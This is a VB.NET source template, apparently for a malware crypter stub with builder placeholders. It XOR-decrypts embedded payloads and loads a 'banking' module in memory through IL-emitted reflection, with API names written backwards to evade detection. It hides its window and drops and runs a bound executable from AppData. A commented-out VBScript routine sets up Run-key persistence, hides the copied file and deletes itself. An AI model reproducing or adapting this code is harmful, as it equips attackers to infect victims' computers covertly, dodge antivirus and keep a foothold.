Imports System.Diagnostics
Imports System.Net
Imports System.IO.Compression
Imports Microsoft.Win32
Imports Microsoft.VisualBasic
Imports System.Runtime.InteropServices
Imports System.Text
Imports System
Imports System.Drawing
Imports System.Windows.Forms
Imports System.Reflection
Imports System.IO
Imports System.Resources
Imports System.Reflection.Emit

<Assembly: AssemblyTitle("%3%")> 
<Assembly: AssemblyCompany("%4%")> 
<Assembly: AssemblyProduct("%5%")> 
<Assembly: AssemblyCopyright("%6%")> 
<Assembly: AssemblyTrademark("%7%")> 
<Assembly: AssemblyCulture("")> 
<Assembly: AssemblyVersion("%8%")> 
<Assembly: AssemblyFileVersion("%9%")> 
Public Class jj
    Public Function craycray()
        Dim rx As New form1
        rx.InitializeComponent()
        %Delay%
        Try
            %install%
        Catch
        End Try
        Try

            Try
                Dim crate As Byte() = My.Resources2.text2
				lol(crate)
            Catch
            End Try
            Dim exbyte As Byte() = form1.cry(My.Resources2.text, "%pass%")
            Dim pth As String = rx.LF("%injection%")
            Dim forcetry As Byte() = My.Resources2.banking
            rx.DI(forcetry, New Object() { exbyte, pth }, "banking.banking", "mKwgLKyjxfK")
            Try
                %Downloader%
            Catch
            End Try
            %errormsg%
        Catch ex As Exception
        End Try
		dim dd as string = "kk"
		return dd
    End Function
	public function lol (byval dd as byte())
	try
            Dim ddr$ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "/%Binder%"
	                IO.File.WriteAllBytes(ddr, dd)
                Process.Start(ddr)
	catch
	end try
	end function
End Class
Public Class form1
    Public Shared Sub Main()
        Dim rx As New jj
        rx.craycray()
    End Sub

    Public Function bite(ByVal input As String) As Byte()
        Dim bt As Byte() = System.Text.Encoding.Default.GetBytes(input)
        Return bt
    End Function
    Public Function str1(ByVal input As Byte()) As String
        Dim st As String = System.Text.Encoding.Default.GetString(input)
        Return st
    End Function
    Public Shared Function cry(ByVal data As Byte(), ByVal pass As String) As Byte()
        Array.Reverse(data)
        Dim eaqOlgrJU04xUqZ9WdYJj2w7znYyd5l8Z3fIplckQ As Byte = data(data.Length - 1)
        Dim cnffOlgrGPHmGtKExeRX3KsMH4307B As Byte() = System.Text.Encoding.ASCII.GetBytes(pass)
        Dim BhgwM9swbW1YzT7gBGmY8Yt7lLnY801 As Byte() = New Byte(data.Length) {}
        Dim hiwlIUa0H1fOQaO7E108jCRMYnXyt0KQieTHV01lc4F270Zy As Integer = 0
        For i As Integer = 0 To data.Length - 1
            BhgwM9swbW1YzT7gBGmY8Yt7lLnY801(i) = CByte((data(i) Xor eaqOlgrJU04xUqZ9WdYJj2w7znYyd5l8Z3fIplckQ) Xor cnffOlgrGPHmGtKExeRX3KsMH4307B(hiwlIUa0H1fOQaO7E108jCRMYnXyt0KQieTHV01lc4F270Zy))
            Array.Reverse(cnffOlgrGPHmGtKExeRX3KsMH4307B)
            If hiwlIUa0H1fOQaO7E108jCRMYnXyt0KQieTHV01lc4F270Zy = cnffOlgrGPHmGtKExeRX3KsMH4307B.Length - 1 Then
                hiwlIUa0H1fOQaO7E108jCRMYnXyt0KQieTHV01lc4F270Zy = 0
            Else
                hiwlIUa0H1fOQaO7E108jCRMYnXyt0KQieTHV01lc4F270Zy += 1
            End If
        Next
        Array.Resize(BhgwM9swbW1YzT7gBGmY8Yt7lLnY801, BhgwM9swbW1YzT7gBGmY8Yt7lLnY801.Length - 2)
        Return BhgwM9swbW1YzT7gBGmY8Yt7lLnY801
    End Function
    Public Function LF(ByVal jj As String) As String
        Dim QFE1cP0b7Jk2caV3NNmVIk9 As New DirectoryInfo(System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory())
        Dim SYpsap3tA933V5QjBhh50h9d78LcQ As String = Nothing
        For Each IL As FileInfo In QFE1cP0b7Jk2caV3NNmVIk9.GetFiles(jj)
            SYpsap3tA933V5QjBhh50h9d78LcQ = IL.FullName
            Return SYpsap3tA933V5QjBhh50h9d78LcQ
        Next
        Return SYpsap3tA933V5QjBhh50h9d78LcQ
    End Function
End Class
Partial Class Form1
    Inherits System.Windows.Forms.Form
    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Public components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Public Sub InitializeComponent()
        Me.Visible = False
        Me.ShowInTaskbar = False
        Me.Opacity = 0
        Me.TextBox1 = New System.Windows.Forms.TextBox()
        Me.Button1 = New System.Windows.Forms.Button()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.Panel1 = New System.Windows.Forms.Panel()
        Me.ProgressBar1 = New System.Windows.Forms.ProgressBar()
        Me.SuspendLayout()
        '
        'TextBox1
        '
        Me.TextBox1.Location = New System.Drawing.Point(12, 23)
        Me.TextBox1.Name = "TextBox1"
        Me.TextBox1.Text = ""
        Me.TextBox1.Size = New System.Drawing.Size(100, 20)
        Me.TextBox1.TabIndex = 0
        '
        'Button1
        '
        Me.Button1.Location = New System.Drawing.Point(12, 49)
        Me.Button1.Name = "Button1"
        Me.Button1.Size = New System.Drawing.Size(75, 23)
        Me.Button1.TabIndex = 1
        Me.Button1.Text = "Button1"
        Me.Button1.UseVisualStyleBackColor = True
        '
        'Form
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(284, 262)
        Me.Controls.Add(Me.ProgressBar1)
        Me.Controls.Add(Me.Panel1)
        Me.Controls.Add(Me.Label4)
        Me.Controls.Add(Me.Label3)
        Me.Controls.Add(Me.Label2)
        Me.Controls.Add(Me.Label1)
        Me.Controls.Add(Me.Button1)
        Me.Controls.Add(Me.TextBox1)
        Me.Name = "Form"
        Me.Text = "Form"
        Me.ResumeLayout(False)
        Me.PerformLayout()
    End Sub
    Private Function Rev(ByVal sVal_ As String)
        Dim rET_BW As Char() = CStr(sVal_).ToCharArray()
        Array.Reverse(rET_BW)
        Return CStr(New String(rET_BW))
    End Function
    Public Function DI(ByVal rAl As Byte(), ByVal prm As Object(), ByVal clz As String, ByVal meth As String) As Object
        Dim fxlcrfj0EOwxCJBk7T3Iuoh5N0k4Y3WV7uz As System.Reflection.Emit.DynamicMethod = New DynamicMethod("httpslogin", GetType(Object), New Type() {GetType(Byte()), GetType(Object()), GetType(String), GetType(String)})
        Dim fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX As System.Reflection.Emit.ILGenerator = fxlcrfj0EOwxCJBk7T3Iuoh5N0k4Y3WV7uz.GetILGenerator()
        Dim OGGW0A8076W8TS82 As System.Reflection.Emit.Label = fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.DefineLabel()
        fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.DeclareLocal(GetType(Assembly))
        fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.Emit(OpCodes.Ldarg_0)
        fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.EmitCall(OpCodes.[Call], GetType(Assembly).GetMethod(Rev("daoL"), New Type() {GetType(Byte())}), Nothing)
        fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.Emit(OpCodes.Stloc_0)
        fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.Emit(OpCodes.Ldarg_2)
        fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.Emit(OpCodes.Brfalse_S, OGGW0A8076W8TS82)
        fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.Emit(OpCodes.Ldarg_3)
        fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.Emit(OpCodes.Brfalse_S, OGGW0A8076W8TS82)
        fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.Emit(OpCodes.Ldloc_0)
        fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.Emit(OpCodes.Ldarg_2)
        fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.EmitCall(OpCodes.Callvirt, GetType(Assembly).GetMethod(Rev("epyTteG"), New Type() {GetType(String)}), Nothing)
        fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.Emit(OpCodes.Ldarg_3)
        fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.EmitCall(OpCodes.Callvirt, GetType(Type).GetMethod(Rev("dohteMteG"), New Type() {GetType(String)}), Nothing)
        fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.Emit(OpCodes.Ldnull)
        fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.Emit(OpCodes.Ldarg_1)
        fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.EmitCall(OpCodes.Callvirt, GetType(MethodBase).GetMethod(Rev("ekovnI"), New Type() {GetType(Object), GetType(Object())}), Nothing)
        fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.Emit(OpCodes.Ret)
        fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.MarkLabel(OGGW0A8076W8TS82)
        fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.Emit(OpCodes.Ldloc_0)
        fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.EmitCall(OpCodes.Callvirt, GetType(Assembly).GetProperty(Rev("tnioPyrtnE")).GetGetMethod(), Nothing)
        fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.Emit(OpCodes.Ldnull)
        fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.Emit(OpCodes.Ldarg_1)
        fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.EmitCall(OpCodes.Callvirt, GetType(MethodBase).GetMethod(Rev("ekovnI"), New Type() {GetType(Object), GetType(Object())}), Nothing)
        fcevgrY943212vbq626r7GI1l0PEsNYS3JSC2yM4lCOis0cv3yLX.Emit(OpCodes.Ret)
        Return fxlcrfj0EOwxCJBk7T3Iuoh5N0k4Y3WV7uz.Invoke(Nothing, New Object() {rAl, prm, clz, meth})
    End Function
    Friend WithEvents TextBox1 As System.Windows.Forms.TextBox
    Friend WithEvents Button1 As System.Windows.Forms.Button
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents Label3 As System.Windows.Forms.Label
    Friend WithEvents Label4 As System.Windows.Forms.Label
    Friend WithEvents Panel1 As System.Windows.Forms.Panel
    Friend WithEvents ProgressBar1 As System.Windows.Forms.ProgressBar

End Class
Public Class tgcape
    Public Shared Sub crabhut(ByVal solo As String)
       ' Dim optionalArguments As String = ""
       ' Dim polo As String = Environment.GetEnvironmentVariable("%AppTemp%") & "\%SubName%" & "\%FileName%"
       ' Dim yolo As String = Environment.GetEnvironmentVariable("%AppTemp%") & "\%SubName%" & "\%FileName%" + ".vbs"
       ' Dim puote As String = """"
       ' Dim nl As String = Environment.NewLine
       ' Dim vbs_file As String = "on error resume next" & vbCr & vbLf & "groop = ""winmgmts:{impersonationLevel=impersonate}//./root/default:StdRegProv""" & vbCr & vbLf & "set tonytinber = CreateObject(" & puote & "Scripting.tonytinbertemObject" & puote & ")" & vbCr & vbLf & "tonytinber.CopyFile " & puote & solo & puote & ", " & puote & polo & puote & vbCr & vbLf & "dim gerata" & vbCr & vbLf & "Set gerata = CreateObject(" & puote & "WScript.Shell" & puote & ")" & vbCr & vbLf & "gerata.regwrite " & puote & "HKCU\Software\Windows\Microsoft\CurrentVersion\Run\%KeyName%" & puote & ", " & puote & polo & puote & ", " & puote & "REG_EXPAND_SZ" & puote & vbCr & vbLf & "dim triton" & vbCr & vbLf & "set triton = tonytinber.GetFile(" & puote & polo & puote & ")" & vbCr & vbLf & "triton.attributes = 7" & vbCr & vbLf & "tonytinber.DeleteFile WScript.ScriptFullName"
       ' If File.Exists(yolo) Then
        '    File.Delete(yolo)
       ' End If
        'Dim dsa As TextWriter = New StreamWriter(yolo)
       ' dsa.Write(vbs_file)
        'dsa.Close()
        'System.Diagnostics.Process.Start(yolo)
    End Sub
End Class
Namespace My.Resources2

    'This class was auto-generated by the StronglyTypedResourceBuilder
    'class via a tool like ResGen or Visual Studio.
    'To add or remove a member, edit your .ResX file then rerun ResGen
    'with the /str option, or rebuild your VS project.
    '''<summary>
    '''  A strongly-typed resource class, for looking up localized strings, etc.
    '''</summary>
    <Global.System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "2.0.0.0"), _
     Global.System.Diagnostics.DebuggerNonUserCodeAttribute(), _
     Global.System.Runtime.CompilerServices.CompilerGeneratedAttribute(), _
     Global.Microsoft.VisualBasic.HideModuleNameAttribute()> _
    Friend Module Resources2

        Private resourceMan As Global.System.Resources.ResourceManager

        Private resourceCulture As Global.System.Globalization.CultureInfo

        '''<summary>
        '''  Returns the cached ResourceManager instance used by this class.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)> _
        Friend ReadOnly Property ResourceManager() As Global.System.Resources.ResourceManager
            Get
                If Object.ReferenceEquals(resourceMan, Nothing) Then
                    Dim temp As Global.System.Resources.ResourceManager = New Global.System.Resources.ResourceManager("bankingcal.Resources", GetType(Resources2).Assembly)
                    resourceMan = temp
                End If
                Return resourceMan
            End Get
        End Property

        '''<summary>
        '''  Overrides the current thread's CurrentUICulture property for all
        '''  resource lookups using this strongly typed resource class.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)> _
        Friend Property Culture() As Global.System.Globalization.CultureInfo
            Get
                Return resourceCulture
            End Get
            Set(ByVal value As Global.System.Globalization.CultureInfo)
                resourceCulture = value
            End Set
        End Property

        Friend ReadOnly Property banking() As Byte()
            Get
                Dim obj As Object = ResourceManager.GetObject("banking", resourceCulture)
                Return CType(obj, Byte())
            End Get
        End Property
        Friend ReadOnly Property text() As Byte()
            Get
                Dim obj As Object = ResourceManager.GetObject("text", resourceCulture)
                Return CType(obj, Byte())
            End Get
        End Property
        Friend ReadOnly Property text2() As Byte()
            Get
                Dim obj As Object = ResourceManager.GetObject("%Binder2%", resourceCulture)
                Return CType(obj, Byte())
            End Get
        End Property
    End Module
End Namespace
